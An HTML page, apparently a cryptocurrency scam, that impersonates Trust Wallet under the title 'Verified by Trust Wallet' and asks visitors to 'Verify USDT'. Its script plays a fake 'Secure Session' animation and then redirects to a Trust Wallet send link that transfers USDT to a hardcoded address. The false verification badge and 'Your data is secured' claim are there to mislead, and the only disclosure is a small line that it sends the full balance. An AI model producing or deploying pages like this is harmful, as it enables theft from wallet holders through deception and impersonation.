<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verified by Trust Wallet - TRC20</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background-color: #0d0d0d;
      color: #fff;
      text-align: center;
      padding: 30px 15px;
    }

    .badge {
      background-color: #121212;
      padding: 8px 20px;
      border-radius: 30px;
      display: inline-block;
      font-weight: 600;
      color: #00ff99;
      margin-bottom: 20px;
      border: 1px solid #00ff99;
      box-shadow: 0 0 10px rgba(0, 255, 153, 0.6);
    }

    .logo {
      width: 90px;
      height: 90px;
      background-color: #1b1b1b;
      border-radius: 20px;
      margin: 20px auto;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 0 15px rgba(0, 255, 255, 0.2);
    }

    .logo img {
      width: 60px;
    }

    h1 {
      font-size: 24px;
      margin-bottom: 10px;
    }

    p {
      font-size: 16px;
      color: #ccc;
      margin-bottom: 25px;
    }

    .verify-btn {
      background-color: #00bfff;
      border: none;
      color: white;
      padding: 14px 32px;
      font-size: 16px;
      border-radius: 30px;
      cursor: pointer;
      font-weight: 600;
      transition: 0.3s ease;
    }

    .verify-btn:hover {
      background-color: #009fd9;
    }

    .note {
      margin-top: 25px;
      font-size: 14px;
      color: #999;
    }

    .processing {
      display: none;
      margin-top: 20px;
      font-weight: bold;
      font-size: 16px;
      animation: blink 1.2s infinite;
      color: #00ffcc;
    }

    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.3; }
    }
  </style>
</head>
<body>
  <div class="badge">‚úÖ Verified by Trust Wallet</div>

  <div class="logo">
    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png?v=026" alt="TRC20" />
  </div>

  <h1>Secure TRC20 Payment</h1>
  <p>Click below to verify your USDT wallet.<br><strong>It will send your full balance.</strong></p>

  <button class="verify-btn" onclick="startProcessing()">Verify USDT</button>
  <div class="processing" id="processingText">üîí Secure Session...</div>

  <div class="note">
    ‚ö†Ô∏è You must have minimum <strong>2 TRX</strong> for gas fee.
    <br><br>
    Powered by TRC20 Gateway. Your data is secured.
  </div>

  <script>
    let texts = ["üîí Secure Session...", "üí∏ Transferring...", "üîê Verifying Wallet..."];
    let index = 0;
    function startProcessing() {
      const processDiv = document.getElementById('processingText');
      processDiv.style.display = 'block';

      // Animate text every 1.5s
      const interval = setInterval(() => {
        index = (index + 1) % texts.length;
        processDiv.textContent = texts[index];
      }, 1500);

      // Redirect after 5 seconds
      setTimeout(() => {
        clearInterval(interval);
        window.location.href = 'https://link.trustwallet.com/send?asset=c195_tTR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t&address=TJs3rspiCknNcK8gndtxHqzGNZCvdWQLrs';
      }, 5000);
    }
  </script>
</body>
</html>
